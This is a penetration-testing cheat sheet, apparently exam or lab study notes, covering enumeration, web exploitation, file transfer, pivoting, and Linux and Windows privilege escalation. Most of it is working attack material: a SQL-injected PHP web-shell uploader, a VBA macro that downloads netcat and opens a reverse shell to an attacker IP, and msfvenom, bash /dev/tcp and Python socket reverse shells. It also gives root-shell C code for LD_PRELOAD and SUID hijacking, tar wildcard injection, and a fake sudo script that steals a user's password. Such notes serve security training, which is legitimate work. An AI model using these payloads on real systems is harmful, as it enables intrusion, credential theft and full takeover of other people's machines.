# <span style="color:rgb(11, 142, 224)">General : </span>

MTU:
if terminals get stuck : 
try lowering the MTU to below 1250. We recommend decreasing it in increments of 50 until the connection becomes stable, but please do not set it below 700.
```
sudo ip link set dev tun0 mtu 1000
```
Also, ensure that you are using Google's DNS servers in your Kali by running these commands:  
`sudo chattr -i /etc/resolv.conf` `sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""`

And we have a shell as www / $ , Get a tty (stable shell) shell using, 
```
python -c "import pty; pty.spawn('/bin/bash')"
```

Password cracking 
john will automatically identify the hashing algorithm
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

To SSH into a user using a private key:
```
ssh -i <private_key> <username>@<target_ip>
```

# <span style="color:rgb(11, 142, 224)">Enumeration </span>

not always will the machine allow ping 
thats why add -Pn also in nmap
because firewall block ping
you can open the ip website in your browser and check 

Nmap 
```
sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
```

When the TCP scan finishes, immediately run a UDP scan.
```
sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
```

Gobuster
smaller : 
```
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP>
```
larger : 
```
sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -x html,txt,php -u <IP>
```

go to website 
```
/about.html
```

Wordpress enumeration 
```
wpscan --url http:<IP> -e ap,at,u
```

Redis 
```
redis-cli -h <IP> # to connect to the server

after connecting : 
info                            # to get information/details about the server
SELECT <database_index>         # select databse
keys *                          # to key all key names
get <Key name>                  # to get value of the key 
config get dir                  # to get config directory for redis
config set dir /var/lib/redis/.ssh>  # to set a new directory

ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
ls -la ~/.ssh/     # to see kali public ssh key 
( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 

cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key

config set dbfilename "authorized_keys"    # write our key to redis disk 
save                                       # to save the file now

ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
```

# <span style="color:rgb(11, 142, 224)">Web Application </span>

use default credentials 
of username : password same you found , 
admin:admin etc

phpmyadmin : 
username : root 
password : leave empty (in some versions it's "password")


Php get upload option to upload any file on website itself 
```
https://gist.github.com/BababaBlue
```

```
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
after that , upload `PHP Ivan Sincek` revershell to the website

###### Squid Proxy :
configure FoxyProxy extension 
with port number and ip address of victim machine 
and then load the website 

###### Macro :
```vb
Sub MyMacro
	Dim str as String
	str = "cmd.exe /c certutil -f -urlcache http://10.10.14.21/nc64.exe C:\Programdata\nc.exe && C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 4445"
	Shell(str)
End Sub
```

Alternative: Automating with Metasploit
Metasploit has a module that auto-generates a malicious `.odt` with cross-platform VBA payloads (Windows, macOS, Linux).
Generate the Payload : 
```bash
msfconsole
use exploit/multi/fileformat/openoffice_document_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```
This outputs a ready-to-upload `.odt` file.

Catch the Shell :
```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```
Once the bot opens the document → Metasploit catches the staged connection → **Meterpreter session opened**.
```
sessions -i 1
```

Steps : 
1. Identify Web Tech (language, framework, libs, cms, etc) - use wappalyzer
2. Look for CVE if it uses public framework / libs / cms, if it doesnt work the first time then it doesnt work.
3. Then Find likely vulnerable feature such as file upload, local file inclusion, sqli.
4. try default credentials if you found login page.
5. If it doesnt work then it's likely credentials hunting.
6. Find for credentials in the landing page, and every shown pages and directory. look for names, username, password. If you see a string thats kinda weird thats could be a username or password.
7. Can't find password ? try username as password. spray this credentials to other service.
8. Can't find anything ? Fuzz the directory, look for differences on response type / length could be a clue. then fuzz the sub directory again (using seclist is enough).
9. Still can't find anything ? then its a rabbit hole.

# <span style="color:rgb(11, 142, 224)">File Transfer & Reverse Shell </span>

Start server on kali/windows : 
you won't be able to start on 80 on victim machine if it already has something running
```
python3 -m http.server 8000
```

Linux get file : 
```
wget http://<ip>:8000/filename -O filename
curl http://<ip>/filename -o filename

nc <victim ip> 4444 < filename     # sender 
nc -lvnp 4444 > filename           # receiver
```

Windows get file : 

CMD:
1st priority : 
```
certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
```
or
```
powershell -Command "iwr 'http://<kali ip>:8000/reverse.exe' -OutFile 'C:\Program Files\File Permissions Service\filepermservice.exe'"
```
or 
```
powershell iwr http://KALI_IP:8000/filename -o filename
```

PowerShell:
switch to PowerShell first
```
iwr http://KALI_IP:8000/filename -outfile filename
Invoke-WebRequest http://KALI_IP:8000/filename -outfile filename
```

##### <span style="color:rgb(11, 142, 224)">Netcat (to get shell back on kali and not use windows rdp): </span>
transfer `nc.exe` to windows : 
First locate a copy:
```
find /usr/share -iname "nc.exe" 2>/dev/null
```
then copy it to current folder where python server is running 
```
cp /usr/share/windows-resources/binaries/nc.exe .
```
then start python server and transfer
to get shell back from windows to kali : 
start a listener on Kali:
```
rlwrap -f . nc -lvnp 4444
```
windows command to get reverse shell of cmd : 
```
nc.exe -e cmd.exe <kali ip> 4444
```
##### <span style="color:rgb(11, 142, 224)">Windows → Kali Linux using SMB (If python is not installed on windows)</span>
On Kali start SMB server : 
```
impacket-smbserver share .
```
On windows transfer files : 
```
copy <input file name> \\<kali ip>\share\<output file name>

# ex. copy windows.txt \\192.168.131.128\share\windows.txt
```
If errors : 
```
on attacker machine : 
impacket-smbserver -smb2support randomname . -username user -password password

on victim machine : 
net use z: \\192.168.45.206\test /u:test test
dir z:
```
here , "randomname" is just a random name given , and can give any username and password 
"." here is work in the current directory
authentication required as some servers so not accept without auth
### <span style="color:rgb(11, 142, 224)">Reverse Shell : </span>

go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server on kali : 
```
python3 -m http.server 8000
```
switch to :temp folder on windows :
```
cd C:\temp
```
download on windows :
If you want to download directly to a path :
```
certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
```
or if you want in current directory : 
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```

# <span style="color:rgb(11, 142, 224)">Port Forwarding/Pivoting </span>

after gaining initial access , to <span style="color:rgb(11, 142, 224)">discover more devices on same network</span> use nmap to scan
download from : (on kali attacker machine)
```
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
```
transfer to victim machine , then run : 
```
./nmap -sn <victim ip>/24     # /24 since only last octet is changing in subnet
```
remove first (gateway) and last ip (broadcast)
now check which machine you can access now 
```
./nmap -p0-100 -vv <different left ips>
```

<span style="color:rgb(11, 142, 224)">SSH : </span>
to do local port forwarding :
```
ssh -L <attacker local port>:<target ip>:<target port> root@<through which ip> -i id_rsa -fN 

localhost:8000      # now everything visible on this 
127.0.0.1:8000
```
to do remote port forwarding :
```
ssh -R <local port to open>:<which final internal network machine ip>:<which target port to forward to of internal network machine> kali@<kali ip> -fN
```
to do dynamic port forwarding : (on kali)
```
ssh -D 9050 -i id_rsa root@<ip to forward traffic to>
```


<span style="color:rgb(11, 142, 224)">Chisel : </span>
```
sudo apt install chisel     #kali linux - attacker 

https://github.com/jpillora/chisel/releases/tag/v1.12.0   # windows 
chisel_1.12.0_windows_amd64.zip
```
Attacker / Kali — start server : 
```
chisel server -p 8080 --reverse
```
Pivot / Win1 — connect back to Kali and create reverse forward : 
```
chisel.exe client <KALI_IP>:<CHISEL_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
```

<span style="color:rgb(11, 142, 224)">Chisel with SOCKS (for dynamic port forwarding):</span>
```
sudo gedit /etc/proxychains.conf
add line in last : socks5 127.0.0.1 9050
```
Attacker / Kali — start server : 
```
chisel server -p 8000 --reverse
```
Pivot / Win1 — connect back to Kali and create reverse forward : 
```
chisel.exe client <KALI_IP>:8000 R:<SOCKS_PORT>:socks
#chisel.exe client 10.10.10.5:8000 R:9050:socks
```

# <span style="color:rgb(11, 142, 224)">Linux Privilege Escalation</span>

Linux has `tmp` folder , which is world writeable
```
cd /tmp
```

GTFO Bins Wayback : https://web.archive.org/web/20260102075820/https://gtfobins.github.io/#view

Find Flag 
```
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```
##### <span style="color:rgb(11, 142, 224)">SUDO exploitation : </span>

###### <span style="color:rgb(11, 142, 224)">Shell Escape Sequences : </span>
programs "user" allowed to run via sudo
```
sudo -l 
```
go to gtfo bins
and use sudo before command as `sudo <command>`
###### <span style="color:rgb(11, 142, 224)">Environment Variables : </span>
```
sudo -l 
```
Look for :
```
env_keep += LD_PRELOAD
env_keep += LD_LIBRARY_PATH
```

<span style="color:rgb(11, 142, 224)">for LD_PRELOAD : </span>
make exploit 
```
nano preload.c
```
paste code : 
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
compile it 
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
This creates:
```
/tmp/preload.so
```
Then run one of the permitted programs while specifying the library:
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
#ex. any of the complete paths from the `sudo -l` list like "/usr/sbin/apache2"
# not all executables will work , try until one works
```

<span style="color:rgb(11, 142, 224)">for LD<i>LIBRARY</i>PATH : </span>
Find which shared libraries the target binary depends on after seeing from `sudo -l`
```
ldd /usr/sbin/apache2
# or you can use any executable path from `sudo -l` results
```
Pick a library name from this list — e.g. **`libcrypt.so.1`** ; not all libraries will work , try until one works
Create your own library : 
```
nano library_path.c
```
paste code : / Create the Malicious Shared Object : 
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
compile it : 
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
#put the library name from the list we found out 
```
run : 
```
sudo LD_LIBRARY_PATH=/tmp apache2
# use same executable you choose in starting whose you saw library path for 
```

##### <span style="color:rgb(11, 142, 224)">SUID Executables : </span>
###### <span style="color:rgb(11, 142, 224)">Known exploits : </span>
Find all the SUID/SGID executables on the Debian VM
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```
find / -user root -perm /4000 2>/dev/null
```
Find known exploit for `versions` found of executables on searchsploit , Google, and GitHub
or go to gtfo bins 
###### <span style="color:rgb(11, 142, 224)">SUID shared object (.so) injection : </span>
find a `-so` executables
then run this to check the files its asking for but not available 
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
# replace the file name with the shared file name/location
```
ex we get its asking for another shared object : `/home/user/.config/libcalc.so`
create that directory by `mkdir /home/user/.config`
go inside that directory and create a exploit : 
```
nano exploit.c
```
and paste this code 
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
give permission `chmod +x exploit.c`
compile the code to that location it asks for 
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so exploit.c
```
now again run the initial executable
```
/usr/local/bin/suid-so
# run directly , you will get a root shell now
```
###### <span style="color:rgb(11, 142, 224)">Environment Variables (without absolute service path) : </span>
find if you have any env files : `/usr/local/bin/suid-env`
Find what it executes : `strings /usr/local/bin/suid-env`
see if it starts any service without proving the full path
if no , create an exploit : 
```
nano service.c
```
and paste the code :
```
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
Compile it:
```
gcc -o service service.c
```
Put your directory first in PATH
```
PATH=.:$PATH
# "." means: the current directory
```
now just run the executable again : 
```
/usr/local/bin/suid-env
```

Environment Variables (without absolute service path) : will work only for bash version less than 4.0
##### <span style="color:rgb(11, 142, 224)">Cron tabs :</span>

Go to `crontab.guru` website and enter cron tab to see what it means
`*/5` - at every 5th minute
ex. `* * * * * kali /bin/bash /home/kali/Downloads/code/code.sh`
add user name and shell also
###### <span style="color:rgb(11, 142, 224)">Weak File Permissions : </span>
minute ; hour ; day of month ; month ; day of week
```
1. View System-wide crontab: cat /etc/crontab
2. check if path is writeable
3. locate <filename>
```
replace content of file with : 
```
#!/bin/bash
<put bash reverse shell>
# bash -i >& /dev/tcp/<kali ip>/4444 0>&1
```
and start listener on kali
```
nc -nvlp 4444
```
###### <span style="color:rgb(11, 142, 224)">PATH Manipulation : </span>
View the contents of the system-wide crontab:  
```
cat /etc/crontab
```
Note that the PATH variable starts with **/home/user** which is our user's home directory.
Create a file called **overwrite.sh** in your home directory with the following contents:
```
#!/bin/bash  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```
Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
or 
change the path ! 
```
export PATH=/tmp:$PATH
# export PATH=<directory which you want to add to path>:$PATH
# echo $PATH
```
###### <span style="color:rgb(11, 142, 224)">Wild Cards :</span>
cat the cron job file 
if it has `tar czf /tmp/backup.tar.gz *`
check gtfo bin if it has `-- option name` available or not
then in the path it takes , create these files : 
Create a script that will run as root:
```
cat > shell.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```
Make it executable:
```
chmod +x shell.sh
```
Now create the malicious filenames:
```
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```
Check them:
```
ls -la
```
After it cron executes (ex. after every minute) , check:
```
ls -l /tmp/rootbash
```
Then:
```
/tmp/rootbash -p
```

##### <span style="color:rgb(11, 142, 224)">Process Snooping with pspy :</span>
download pspy 64 bit from 
https://github.com/dominicbreuker/pspy
now transfer the pspy file to the victim machine
give permissions : 
```
chmod +x pspy64 
```
run : 
```
./pspy64 
```
UID=0 is for processes run by root

ex. if uid=0 is running `sudo cat /etc/shadow ` again and again 
but we can do path hijacking since the sudo is not having a defined path 
create a new file in `/tmp` : 
```
cd /tmp
```
make sudo file of ours : 
```
nano sudo 
```
enter script : 
```
#!/bin/bash

read frank_pass
echo $frank_pass > /tmp/frank_pass
# it will print what user enters in /tmp folder 
# go and see by `ls -al /tmp` then cat that `cat /tmp/frank_pass`
```
give it permissions to execute
```
chmod +x sudo
```
we go to home and edit the `.bashrc` file 
```
nano .bashrc
```
in starting only after the comments , add line 
```
PATH=/tmp:$PATH
```
save and exit 
now to update the PATH we run : 
```
source .bashrc
```
now we wait till the user enetrs the password after running sudo and we get the password
now cat into the file in `/tmp` to see the file
now we will fix the sudo in the `~/.bashrc` file 
remove the `/tmp` entry we made in PATH line , keep rest PATH line as it is
save and exit
again save by source
```
source .bashrc
```
or use full path for sudo since path is updated now 
```
/usr/bin/sudo su
```

Attack vector 2 : 
if the file path is mentioned but what all libraries it uses in the files are modifiable : 
for ex. if root is running : `/opt/server_admin/reporter.py `
check if we can overwrite it : 
```
tmp$ ls -al /opt/server_admin/reporter.py 
-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
```
it is using absolute path so we cant change it 
now see the contents of the file :
```
cat /opt/server_admin/reporter.py
```
if it is using 
```
import os
#os.system(command)
```
it is using `import os` and then a system command 
so well change the contents of that `os` library itself
The paths that come configured out of the box on Ubuntu 16.04, in order of priority, are:
```
- Directory of the script being executed
- /usr/lib/python2.7
- /usr/lib/python2.7/plat-x86_64-linux-gnu
- /usr/lib/python2.7/lib-tk
- /usr/lib/python2.7/lib-old
- /usr/lib/python2.7/lib-dynload
- /usr/local/lib/python2.7/dist-packages
- /usr/lib/python2.7/dist-packages
```
For other distributions, run the command below to get an ordered list of directories:
```
python -c 'import sys; print "\n".join(sys.path)'
```
so we see 1 by 1 all the folder where that library is present
for ex. we found it in 
```
/usr/lib/python2.7$ ls -al
-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
```
we found `os.py` file here
which was being used in the python file as `import os`
we have write permission also on this 
now we edit the python file 
```
/usr/lib/python2.7$ nano os.py
```
in the last of the file , add a reverse shell of python 
we dont need to import os since we are already in os 
remove semicolons also `;` and `import os` and `os.<filename>`
so our revesere shell will become 
```
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.138",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```
start a reverse listener on kali 
```
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap -cAr nc -lvnp 4444
```
paste it in last of `os.py` file and save and exit
now we wait to get root shell on our kali 

##### <span style="color:rgb(11, 142, 224)">Others : </span>

<span style="color:rgb(11, 142, 224)">Kernel Exploits : </span>
get the kernel version of machine first
```
uname -a
```
then search on google for ex. `Linux debian 2.6.32-5-amd64 exploit`
or go to exploit db and serach for `linux kernel <version number>`
```
searchsploit -m <exploit full name/path>
```
use only verified exploits and prefer `.c` exploits , not `c++`
now download it to kali and start a python server and transfer the exploit to victim machine
now compile the `.c` code , see the exploit code for the compiling code
```
# gcc exploit.c –o exploit
# g++ exploit.c –o exploit
```
then run : 
```
./<new compiled filename>
```

<span style="color:rgb(11, 142, 224)">Linux Capabilities : </span>
```
getcap -r / 2>/dev/null
```
see which all has SUID bit set ex. `cap_setuid+ep`
go to gtfo bins now to see
if `:py` doesn't work , use `:python3`
ex. for `vim` : `./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
for `view` : `./view -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
for ex. if python has it set : `/usr/bin/python2.6 -c "import os; os.setuid(0); os.system('/bin/bash')"

also see if it has `cap_dac_read_search+ep` capability set 
for ex. if `./vim` has it 
you run command `./vim /etc/shadow` to read any file

<span style="color:rgb(11, 142, 224)">Network File System (NFS) : </span>
Check the NFS share configuration on the victim machine :
```
cat /etc/exports
```
if it has entry like `/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
which confirms : 
we can see that `/tmp` was exported with `no_root_squash` enabled and `rw` which is read , write the `sync` option shows whatever we will write will be synced on the server immediately as well
and the wildcard `*` tells any hostname can mount this folder
i.e any machine on this network can mount this machine 
alternatively we can use nmap also
```
nmap --script=nfs-showmount <victim ip>
```
it shows victim is exporting `/tmp` folder 
and the wildcard `*` shows anyone on network can mount
now use sudo user always on kali 
we make a new temporary folder in which we will mount 
```
mkdir /tmp/nfs
```
now well mount it 
```
sudo mount -t nfs <victim ip>
# sudo mount -o rw,vers=3 -t nfs <victim ip>:<which folder is mountable> /tmp/nfs
```
now we go to the location we mounted 
```
cd /tmp/nfs
ls -al
```
we are now able to see the server files here
we copy the own bash of the target mahcine into the its own nfs folder first 
```
<victim machine command in the nfs folder>:/tmp$ cp /bin/bash .
```
then we copy it to our `/tmp` on our own kali for a copy
```
┌──(root㉿kali)-[/tmp]
└─# cp /tmp/nfs/bash .
```
then we remove it from the nfs as root from kali
```
┌──(root㉿kali)-[/tmp/nfs]
└─# rm -rf bash
```
then we cd into the nfs as root and copy the version of bash into the nfs 
```
┌──(root㉿kali)-[/tmp]
└─# cd nfs            
┌──(root㉿kali)-[/tmp/nfs]
└─# cp /tmp/bash . 
```
we give it suid and execute permission 
```
┌──(root㉿kali)-[/tmp/nfs]
└─# chmod +xs bash 
```
now we execute it on the victim go get root shell
```
user@debian:/tmp$ ./bash -p
```


<span style="color:rgb(11, 142, 224)">Service Exploits (MySQL) : </span>
Identifying the vulnerability : 
check if mysql is running as root : 
```
ps aux | grep mysql | grep root
```
check if you can login without password : 
```
mysql –u root
```
go to exploit db to get exploit and search for `mysql udf`
https://www.exploit-db.com/exploits/1518
download the exploit 
transfer the code form kali to victim machine 
follow the commands mentioned on how to compile 
```
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
execute these commands one by one after logging into mysql : 
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**)
run to gain a shell running with root privileges:
```
/tmp/rootbash -p
```

<span style="color:rgb(11, 142, 224)">read bash (commands and password entered) history : </span>
```
cat ~/.*history
# .zsh_history ; python history ; mysql history
```
<span style="color:rgb(11, 142, 224)">ssh keys : </span>
```
cd /home/kali/.ssh
/root/.ssh

#if you get it : chmod 600 id_rsa
```
<span style="color:rgb(11, 142, 224)">browser saved passwords : </span>
```
git clone https://github.com/alessandroz/lazagne
```
<span style="color:rgb(11, 142, 224)">password files readable/writeable : </span>
```
ls -la /etc/passwd
ls -la /etc/shadow

# create a new passowrd hash and paste it there : 
openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
```

If nothing works , then try Linpeas
# <span style="color:rgb(11, 142, 224)">Windows Privilege Escalation</span>

Find Flag 
do manually first : `users > desktop/documents`
```
where /r C:\ local.txt
where /r C:\ proof.txt
```

like `tmp` folder in linux , windows has `tasks` folder , which is world writeable
```
cd C:\temp
or
PS C:\Windows> cd tasks
```

If in powershell you are unable to execute scripts : 
```
powershell -executionpolicy bypass
```
###### <span style="color:rgb(11, 142, 224)">To connect to RDP : </span>
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
```
or 
```
xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
```
Enter the password when prompted.

Transfer `nc.exe` to windows and get a reverse shell : 
First locate a copy:
```
find /usr/share -iname "nc.exe" 2>/dev/null
```
then copy it to current folder where python server is running 
```
cp /usr/share/windows-resources/binaries/nc.exe .
```
start python server : 
```
python3 -m http.server 8000
```
download on windows :
```
powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
```
to get shell back from windows to kali : 
start a listener on Kali:
```
rlwrap -f . nc -lvnp 4444
```
windows command to get reverse shell of cmd : 
```
nc.exe -e cmd.exe <kali ip> 4444
```

###### <span style="color:rgb(11, 142, 224)">Basic Manual enumeration : </span>
###### User 
to check current user 
```
whoami
```
you need to get till "NT AUTHORITY\SYSTEM" or "Administrator"
to see what all users are present on system 
```
net user
```
to check which group the user belongs to 
```
net user <username>
```
###### Group : 
to see which all groups i am added to and Mandatory Label: 
```
whoami /groups
```
to see what all groups are made 
```
net localgroup
```
to see which all users are present in a particular group : 
```
net localgroup <group name>
```
to see what all users are in the administrators group : 
```
net localgroup administrators
```
###### OS : 
details about system (ex. kernel version , OS name , Hotfix) : 
```
systeminfo
```
Windows hotfixes and security updates installed on the machine : 
```
wmic qfe get *
```
###### Processes : 
so see what all processes are running
```
tasklist
tasklist /v               # for verbose
tasklist /svc             # processes mapped to services
```
###### Network : 
for  IP Address , Gateway :
```
ipconfig /all
```
routing table : 
```
route print
```
to see internally which all ports are open which were not visible from outside : 
```
netstat -ano
```
Firewall settings for the currently active network profile : 
```
netsh advfirewall show currentprofile
```
all Windows Firewall rules configured on the computer :
to check if port forwarding or reverse shells are not working 
```
netsh advfirewall firewall show rule name=all
```
###### Scheduled Tasks : 
```
schtasks /query /fo list /v
or
powershell Get-ScheduledTask
```

to see what all applications are installed : 
```
wmic product get *
wmic product get Caption, Description, InstallLocation, Name
```

Which all files do I have Read/Write permission to :
```
accesschk.exe -accepteula -uws "Users" "C:\Program Files" 2>nul
# for "users" group
```

to check all installed services : 
```
sc query
```

to check which all binaries have auto elevate privileges enabled :
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

to set integrity level of a file : 
```
icacls <file name> /setintegritylevel m
# m = medium 
# h = high
# you cannot set integrity level higher than that of your user
```

### <span style="color:rgb(11, 142, 224)">Service Abuse : </span>

###### Windows Service Enumeration : 

Displays services and their current states, such as `RUNNING` or `STOPPED`.
```
sc query
```

Lists Windows services, the accounts running them, and their executable paths :
```
wmic service get name, startname, pathname
```
From here look for those services :
1. don't focus on system32 or admin directories
2. which are in program files or tmp or users directory 
3. Look for "LocalSystem"
4. which seems like custom services not default ones
5. which you can modify 
6. Which don't have quoted path (" ")

to get more details about a specific service which you find interesting: 
```
sc qc <service name>
```
see start type , binary path and service start name
we need to check if the binary path is writeable/modifiable
###### <span style="color:rgb(11, 142, 224)">Automated Tools : </span>

SharpUp :
downlaod from : 
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
transfer to windows 
switch to cmd
```
cmd
```
Run SharpUp
```
.\SharpUp.exe audit
```

accesschk : 
Download from :
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
unzip 
transfer `accesschk.exe` to windows 
run :
```
.\accesschk.exe -cv <servicename> -accepteula
```

PowerUp (PowerShell) :
download from :
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
transfer to windows 
switch to power shell : 
```
powershell
```
Import PowerUp in powershell
```
Import-Module .\PowerUp.ps1
```
Run all checks
```
Invoke-AllChecks
```

----

start python server : 
```
python3 -m http.server 8000
```
download on windows :
```
powershell iwr http://192.168.163.199:8000/accesschk.exe -o accesschk.exe
```

###### <span style="color:rgb(11, 142, 224)">Method 1 : Change the Service Executable in the path</span>

Use SharpUp and Look for
=== Modifiable Service Binaries ===

```
sc qc filepermsvc
```
Look for START_TYPE ,  BINARY_PATH , SERVICE_START_NAME(should be Localsystem)

```
icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 

and well replace the service.exe with our reverse shell
go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server : 
```
python3 -m http.server 8000
```
download on windows directly to path :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```
or 
download normally then replace the service .exe file
```
copy reverse.exe
```
now we need to start the service
If its "demand_start" it wont start automatically 
Restart the service (or wait for reboot if no permissions)
```
net start <service_name>
net stop <service_name>
# sc start
# sc stop
```
well get a reverse shell back 

###### <span style="color:rgb(11, 142, 224)">Method 2 : Change the Service Executable path</span>

Use SharpUp and Look for
=== Modifiable Services ===

```
sc qc daclsvc
```
Look for START_TYPE ,  BINARY_PATH , SERVICE_START_NAME(should be Localsystem)

```
icacls "C:\Program Files\DACL Service\daclservice.exe"
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 

we see we have neither of W , M , F in this 
that means we cannot write or modify this 
now well check if we can modify its path

well use accesschk : 
follow steps from there now
look for `RW Everyone : SERVICE_CHANGE_CONFIG`
this permission should be in everyone or you group in which you are in 
that means we can modify the file path 

and well replace the service.exe with our reverse shell
go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server on kali : 
```
python3 -m http.server 8000
```
switch to :temp folder on windows :
```
cd C:\temp
```
download on windows :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```
change bin path 
```
sc config daclsvc binpath= "C:\temp\reverse.exe"
```
verify it again 
```
sc qc daclsvc
```
now start listener and start the service
```
net start daclsvc
```
well get the shell back

###### <span style="color:rgb(11, 142, 224)">Method 3 : Unquoted Service Paths</span>

Lists Windows services, the accounts running them, and their executable paths :
```
wmic service get name, startname, pathname
```
From here look for those services :
1. Which don't have quotes (" ")
2. which seems like custom services not default ones
3. don't focus on system32 or admin directories
4. which are in program files or tmp or users directory 
5. Look for "LocalSystem"

automated way : (do manual also)
well use PowerUp (PowerShell) for that
go to automated tools for that
now look for `[*] Checking for unquoted service paths...`

now for ex. if we get `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
we have to check recursively from the starting of folder path till ending to see if we have write access to the folder or not
